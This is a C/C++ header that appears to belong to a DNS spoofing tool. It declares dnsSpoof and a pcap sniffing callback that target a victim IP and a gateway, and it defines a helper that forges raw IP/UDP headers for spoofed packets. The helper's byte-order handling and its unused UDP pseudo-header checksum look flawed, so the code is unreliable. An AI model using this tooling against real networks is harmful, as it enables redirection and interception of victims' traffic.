#ifndef MAIN_H
#define MAIN_H

#include <string.h>

#include "NetworkEngine.h"
#include "UdpStack.h"
#include "checksum.h"

struct DnsSniffArgs {
    NetworkEngine *net;
    struct in_addr *victimIp;
    struct in_addr *gatewayIP;
    int rawSocket;
};

void dnsSpoof(struct DnsSniffArgs *args);
void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                  const unsigned char *packet);

inline void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src,
                            const struct in_addr &dst, const unsigned short sport,
                            const unsigned short dport, const int payloadSize) {
    struct iphdr *ipBuffer = (struct iphdr *)buffer;
    struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
    ipBuffer->ihl = 5;
    ipBuffer->version = 4;
    ipBuffer->tos = 0;
    ipBuffer->id = (int)(244.0 * rand() / (RAND_MAX + 1.0));
    ipBuffer->frag_off = 0;
    ipBuffer->ttl = 64;
    ipBuffer->protocol = IPPROTO_UDP;
    ipBuffer->check = 0;
    ipBuffer->saddr = htonl(src.s_addr);
    ipBuffer->daddr = htonl(dst.s_addr);
    ipBuffer->check = in_cksum((unsigned short *)ipBuffer, 20);
    udpBuffer->source = htons(sport);
    udpBuffer->dest = htons(dport);
    udpBuffer->len = htons(8 + payloadSize);
    struct UdpPseudoHeader pseudo_header;
    pseudo_header.srcAddr = ipBuffer->saddr;
    pseudo_header.dstAddr = ipBuffer->daddr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_UDP;
    pseudo_header.udpLen = htons(udpBuffer->len);
    memcpy((char *)&pseudo_header.udp, (char *)udpBuffer, 8);
    ipBuffer->tot_len = htons(20 + 8 + payloadSize);
}

#endif
